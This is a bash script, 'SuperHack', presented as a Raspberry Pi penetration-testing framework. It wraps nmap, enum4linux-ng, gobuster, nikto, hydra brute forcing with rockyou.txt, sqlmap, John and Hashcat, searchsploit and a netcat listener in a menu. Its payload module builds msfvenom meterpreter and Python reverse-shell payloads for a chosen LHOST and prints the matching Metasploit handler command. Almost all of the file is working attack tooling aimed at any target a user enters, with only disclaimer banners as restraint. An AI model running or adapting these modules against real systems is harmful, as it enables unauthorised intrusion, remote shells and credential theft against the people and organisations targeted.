#!/bin/bash

# SuperHack - Penetration Testing Automation Framework
# For authorized security testing only
# Compatible with Raspberry Pi (ARM architecture)
# Copywrite 2026 Evan Marr
# FOR EDUCATIONAL PURPOSES ONLY!!!

VERSION="2.0"
CONFIG_DIR="$HOME/.superhack"
LOG_DIR="$CONFIG_DIR/logs"
WORDLISTS_DIR="$CONFIG_DIR/wordlists"
RESULTS_DIR="$CONFIG_DIR/results"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m' # No Color

# Strict sudo check - exit immediately if not root
if [[ $EUID -ne 0 ]]; then
    echo "Must run with sudo. Quitting!"
    exit 1
fi

# New Banner
show_banner() {
    clear
    echo -e "${CYAN}"
    cat << "EOF"
    ███████╗██╗   ██╗██████╗ ███████╗██████╗ ██╗  ██╗ █████╗  ██████╗██╗  ██╗
    ██╔════╝██║   ██║██╔══██╗██╔════╝██╔══██╗██║  ██║██╔══██╗██╔════╝██║ ██╔╝
    ███████╗██║   ██║██████╔╝█████╗  ██████╔╝███████║███████║██║     █████╔╝
    ╚════██║██║   ██║██╔═══╝ ██╔══╝  ██╔══██╗██╔══██║██╔══██║██║     ██╔═██╗
    ███████║╚██████╔╝██║     ███████╗██║  ██║██║  ██║██║  ██║╚██████╗██║  ██╗
    ╚══════╝ ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
EOF
    echo -e "${MAGENTA}                    [ Raspberry Pi Edition v$VERSION ]${NC}"
    echo -e "${RED}                    [ Authorized Use Only ]${NC}"
    echo -e "${BLUE}                    [ Copywrite 2026 By Evan Marr ]${NC}"
    echo ""

}

# Initialize directories
init_dirs() {
    mkdir -p "$CONFIG_DIR" "$LOG_DIR" "$WORDLISTS_DIR" "$RESULTS_DIR"
    mkdir -p "$RESULTS_DIR/nmap" "$RESULTS_DIR/enumeration" "$RESULTS_DIR/exploitation"
}

# Check and install a single package
check_install() {
    local pkg=$1
    local cmd=${2:-$pkg}
    
    if ! command -v "$cmd" &> /dev/null; then
        echo -e "${YELLOW}[!] $pkg not found. Installing...${NC}"
        apt-get install -y "$pkg" 2>/dev/null || {
            echo -e "${RED}[!] Failed to install $pkg${NC}"
            return 1
        }
        echo -e "${GREEN}[+] $pkg installed successfully${NC}"
    fi
}

# Check and install Python package
check_pip_install() {
    local pkg=$1
    local import_name=${2:-$pkg}
    
    if ! python3 -c "import $import_name" 2>/dev/null; then
        echo -e "${YELLOW}[!] Python package $pkg not found. Installing...${NC}"
        pip3 install "$pkg" 2>/dev/null || {
            echo -e "${RED}[!] Failed to install $pkg${NC}"
            return 1
        }
        echo -e "${GREEN}[+] $pkg installed successfully${NC}"
    fi
}

# Install all dependencies
install_deps() {
    echo -e "${BLUE}[*] Checking and installing dependencies...${NC}"
    
    # Update package lists
    apt-get update -qq
    
    # Core tools
    check_install nmap
    check_install metasploit-framework msfvenom
    check_install netcat-traditional nc
    check_install hydra
    check_install gobuster
    check_install dirb
    check_install enum4linux-ng enum4linux-ng
    check_install john
    check_install hashcat
    check_install sqlmap
    check_install nikto
    check_install masscan
    check_install dnsutils dig
    check_install whois
    check_install curl
    check_install wget
    check_install git
    check_install iw
    check_install tcpdump
    check_install proxychains4 proxychains4
    check_install nmap-common nmap
    check_install wireless-tools iwconfig
    check_install aircrack-ng
    
    # Python3 and pip
    check_install python3
    check_install python3-pip pip3
    
    # Python packages
    check_pip_install impacket impacket
    check_pip_install requests requests
    check_pip_install beautifulsoup4 bs4
    check_pip_install scapy scapy
    check_pip_install pwntools pwn
    
    # Download wordlists
    echo -e "${BLUE}[*] Checking wordlists...${NC}"
    
    if [[ ! -f "$WORDLISTS_DIR/rockyou.txt" ]]; then
        echo -e "${YELLOW}[!] Downloading rockyou.txt...${NC}"
        wget -q --show-progress https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -O "$WORDLISTS_DIR/rockyou.txt" || \
        wget -q https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -O "$WORDLISTS_DIR/rockyou.txt"
        if [[ -f "$WORDLISTS_DIR/rockyou.txt" ]]; then
            echo -e "${GREEN}[+] rockyou.txt downloaded${NC}"
        else
            echo -e "${RED}[!] Failed to download rockyou.txt${NC}"
        fi
    fi
    
    if [[ ! -d "$WORDLISTS_DIR/seclists" ]]; then
        echo -e "${YELLOW}[!] Downloading SecLists...${NC}"
        git clone --depth 1 https://github.com/danielmiessler/SecLists.git "$WORDLISTS_DIR/seclists"
        echo -e "${GREEN}[+] SecLists downloaded${NC}"
    fi
    
    # Update Metasploit database
    if command -v msfdb &> /dev/null; then
        echo -e "${BLUE}[*] Initializing Metasploit database...${NC}"
        msfdb init 2>/dev/null || true
    fi
    
    echo -e "${GREEN}[+] All dependencies checked and installed${NC}"
    echo -n "Press Enter to continue..."
    read
}

# Network Discovery
network_discovery() {
    check_install nmap
    echo -e "${BLUE}[*] Network Discovery Module${NC}"
    echo -n "Enter target subnet (e.g., 192.168.1.0/24): "
    read subnet
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    output_file="$RESULTS_DIR/nmap/discovery_$timestamp.txt"
    
    echo -e "${YELLOW}[*] Scanning $subnet for live hosts...${NC}"
    nmap -sn "$subnet" -oN "$output_file"
    
    echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
    cat "$output_file"
    echo -n "Press Enter to continue..."
    read
}

# Port Scanner
port_scanner() {
    check_install nmap
    echo -e "${BLUE}[*] Port Scanner Module${NC}"
    echo -n "Enter target IP/hostname: "
    read target
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    output_file="$RESULTS_DIR/nmap/portscan_$timestamp"
    
    echo -e "${YELLOW}[*] Running comprehensive port scan on $target...${NC}"
    
    # Quick scan first
    nmap -sS -T4 --top-ports 1000 -oN "${output_file}_quick.txt" "$target"
    
    # Full scan in background
    echo -e "${YELLOW}[*] Running full port scan (this may take a while)...${NC}"
    nmap -sS -sV -sC -O -p- -T4 -oN "${output_file}_full.txt" "$target" &
    
    echo -e "${GREEN}[+] Quick scan complete. Full scan running in background.${NC}"
    cat "${output_file}_quick.txt"
    echo -n "Press Enter to continue..."
    read
}

# SMB Enumeration
smb_enum() {
    check_install enum4linux-ng enum4linux-ng
    echo -e "${BLUE}[*] SMB Enumeration Module${NC}"
    echo -n "Enter target IP: "
    read target
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    output_file="$RESULTS_DIR/enumeration/smb_${target}_${timestamp}.txt"
    
    echo -e "${YELLOW}[*] Enumerating SMB shares and users...${NC}"
    enum4linux-ng -A "$target" | tee "$output_file"
    
    echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
    echo -n "Press Enter to continue..."
    read
}

# Web Enumeration
web_enum() {
    check_install gobuster
    check_install nikto
    echo -e "${BLUE}[*] Web Enumeration Module${NC}"
    echo -n "Enter target URL (e.g., http://target.com): "
    read target
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    output_dir="$RESULTS_DIR/enumeration/web_$timestamp"
    mkdir -p "$output_dir"
    
    echo -e "${YELLOW}[*] Running directory brute force...${NC}"
    if [[ -f "$WORDLISTS_DIR/seclists/Discovery/Web-Content/common.txt" ]]; then
        gobuster dir -u "$target" -w "$WORDLISTS_DIR/seclists/Discovery/Web-Content/common.txt" \
            -o "$output_dir/directories.txt" -t 50
    else
        gobuster dir -u "$target" -w "/usr/share/wordlists/dirb/common.txt" \
            -o "$output_dir/directories.txt" -t 50
    fi
    
    echo -e "${YELLOW}[*] Running Nikto scan...${NC}"
    nikto -h "$target" -o "$output_dir/nikto.txt"
    
    echo -e "${GREEN}[+] Results saved to: $output_dir${NC}"
    echo -n "Press Enter to continue..."
    read
}

# Brute Force
brute_force() {
    check_install hydra
    echo -e "${BLUE}[*] Brute Force Module${NC}"
    echo "Select service:"
    echo "1) SSH"
    echo "2) FTP"
    echo "3) SMB"
    echo "4) HTTP Basic Auth"
    echo -n "Choice: "
    read choice
    
    echo -n "Enter target IP: "
    read target
    echo -n "Enter username (or 'userlist.txt' for list): "
    read user
    echo -n "Use rockyou.txt wordlist? (y/n): "
    read use_rockyou
    
    if [[ "$use_rockyou" == "y" ]]; then
        wordlist="$WORDLISTS_DIR/rockyou.txt"
    else
        echo -n "Enter wordlist path: "
        read wordlist
    fi
    
    case $choice in
        1)
            service="ssh"
            hydra -l "$user" -P "$wordlist" "$target" "$service" -t 4
            ;;
        2)
            service="ftp"
            hydra -l "$user" -P "$wordlist" "$target" "$service"
            ;;
        3)
            hydra -l "$user" -P "$wordlist" "$target" smb
            ;;
        4)
            echo -n "Enter URL path (e.g., /admin): "
            read path
            hydra -l "$user" -P "$wordlist" "$target" http-get "$path"
            ;;
    esac
    
    echo -n "Press Enter to continue..."
    read
}

# Payload Generator
payload_gen() {
    check_install metasploit-framework msfvenom
    echo -e "${BLUE}[*] Payload Generator (msfvenom)${NC}"
    echo "Select payload type:"
    echo "1) Linux x86 Reverse Shell"
    echo "2) Linux x64 Reverse Shell"
    echo "3) Windows Reverse Shell"
    echo "4) Python Reverse Shell"
    echo "5) Custom"
    echo -n "Choice: "
    read choice
    
    echo -n "Enter LHOST (your IP): "
    read lhost
    echo -n "Enter LPORT: "
    read lport
    echo -n "Enter output filename: "
    read filename
    
    case $choice in
        1)
            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf -o "$filename"
            ;;
        2)
            msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf -o "$filename"
            ;;
        3)
            msfvenom -p windows/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe -o "$filename"
            ;;
        4)
            msfvenom -p cmd/unix/reverse_python LHOST="$lhost" LPORT="$lport" -o "$filename"
            ;;
        5)
            echo -n "Enter msfvenom payload name: "
            read payload
            echo -n "Enter format (elf/exe/python/psh): "
            read format
            msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" -f "$format" -o "$filename"
            ;;
    esac
    
    echo -e "${GREEN}[+] Payload saved as: $filename${NC}"
    echo -e "${YELLOW}[*] Setting up listener...${NC}"
    echo "Run this in another terminal:"
    echo -e "${RED}msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD <payload>; set LHOST $lhost; set LPORT $lport; exploit\"${NC}"
    echo -n "Press Enter to continue..."
    read
}

# Password Cracking
password_crack() {
    echo -e "${BLUE}[*] Password Cracking Module${NC}"
    echo "1) John the Ripper"
    echo "2) Hashcat"
    echo -n "Choice: "
    read choice
    
    echo -n "Enter hash file path: "
    read hashfile
    
    case $choice in
        1)
            check_install john
            echo -n "Enter hash format (or 'auto'): "
            read format
            if [[ "$format" == "auto" ]]; then
                john "$hashfile"
            else
                john --format="$format" "$hashfile"
            fi
            john --show "$hashfile"
            ;;
        2)
            check_install hashcat
            echo -n "Enter hash mode number (0 for MD5, 100 for SHA1, etc): "
            read mode
            hashcat -m "$mode" "$hashfile" "$WORDLISTS_DIR/rockyou.txt" --force
            ;;
    esac
    
    echo -n "Press Enter to continue..."
    read
}

# Exploit Search
exploit_search() {
    check_install metasploit-framework searchsploit
    echo -e "${BLUE}[*] Exploit Database Search${NC}"
    echo -n "Enter search term (service/version): "
    read term
    
    searchsploit "$term"
    
    echo -n "View details of exploit? (enter ID or n): "
    read exploit_id
    if [[ "$exploit_id" != "n" ]]; then
        searchsploit -x "$exploit_id"
    fi
    
    echo -n "Press Enter to continue..."
    read
}

# Listener setup
listener() {
    check_install netcat-traditional nc
    echo -e "${BLUE}[*] Quick Listener Setup${NC}"
    echo -n "Enter port to listen on: "
    read port
    echo -n "Protocol (tcp/udp): "
    read proto
    
    echo -e "${GREEN}[+] Starting netcat listener on port $port...${NC}"
    echo -e "${YELLOW}[*] Press Ctrl+C to stop${NC}"
    nc -lvp "$port"
}

# FIXED WiFi scanning - now waits for user input
wifi_scan() {
    check_install iw
    check_install wireless-tools
    echo -e "${BLUE}[*] WiFi Scanning Module${NC}"
    
    # Show available interfaces first
    echo -e "${YELLOW}[*] Available wireless interfaces:${NC}"
    iw dev 2>/dev/null | grep Interface | awk '{print $2}' || ip link show | grep wl
    
    echo ""
    echo -n "Enter wireless interface (e.g., wlan0, wlan1): "
    read iface
    
    # Check if interface exists
    if ! ip link show "$iface" &> /dev/null; then
        echo -e "${RED}[!] Interface $iface not found!${NC}"
        echo -n "Press Enter to continue..."
        read
        return
    fi
    
    # Bring interface up if down
    ip link set "$iface" up 2>/dev/null
    
    echo -e "${YELLOW}[*] Scanning for wireless networks on $iface...${NC}"
    echo -e "${CYAN}========================================${NC}"
    
    # Try different scanning methods
    if command -v iwlist &> /dev/null; then
        iwlist "$iface" scan 2>/dev/null | grep -E "ESSID|Channel|Encryption|Signal|Quality" | head -50
    elif command -v iw &> /dev/null; then
        iw dev "$iface" scan 2>/dev/null | grep -E "SSID|signal|channel|capability" | head -50
    fi
    
    echo -e "${CYAN}========================================${NC}"
    echo -e "${GREEN}[+] Scan complete${NC}"
    echo ""
    echo -n "Press Enter to return to main menu..."
    read
}

# SQLMap wrapper
sql_injection() {
    check_install sqlmap
    echo -e "${BLUE}[*] SQL Injection Module${NC}"
    echo -n "Enter target URL (with parameter, e.g., http://site.com/page.php?id=1): "
    read target
    
    echo -e "${YELLOW}[*] Running SQLMap...${NC}"
    sqlmap -u "$target" --batch --random-agent --level=2 --risk=1
    
    echo -n "Press Enter to continue..."
    read
}

# Main menu
main_menu() {
    while true; do
        show_banner
        echo -e "${GREEN}Main Menu:${NC}"
        echo "1) Network Discovery"
        echo "2) Port Scanner"
        echo "3) SMB Enumeration"
        echo "4) Web Enumeration"
        echo "5) Brute Force"
        echo "6) Payload Generator"
        echo "7) Password Cracking"
        echo "8) Exploit Search"
        echo "9) Netcat Listener"
        echo "10) WiFi Scanner"
        echo "11) SQL Injection Scan"
        echo "12) Install/Update All Dependencies"
        echo "13) View Logs"
        echo "0) Exit"
        echo ""
        echo -n "Select option: "
        read choice
        
        case $choice in
            1) network_discovery ;;
            2) port_scanner ;;
            3) smb_enum ;;
            4) web_enum ;;
            5) brute_force ;;
            6) payload_gen ;;
            7) password_crack ;;
            8) exploit_search ;;
            9) listener ;;
            10) wifi_scan ;;
            11) sql_injection ;;
            12) install_deps ;;
            13) ls -la "$LOG_DIR"; echo -n "Press Enter to continue..."; read ;;
            0) 
                echo -e "${GREEN}Goodbye!${NC}"
                clear
		exit 0
                ;;
            *) 
                echo -e "${RED}Invalid option${NC}"
                sleep 1
                ;;
        esac
    done
}

# Signal handling
trap 'echo -e "\n${RED}Interrupted! Exiting...${NC}"; exit 1' INT
clear

# Script execution
init_dirs
main_menu
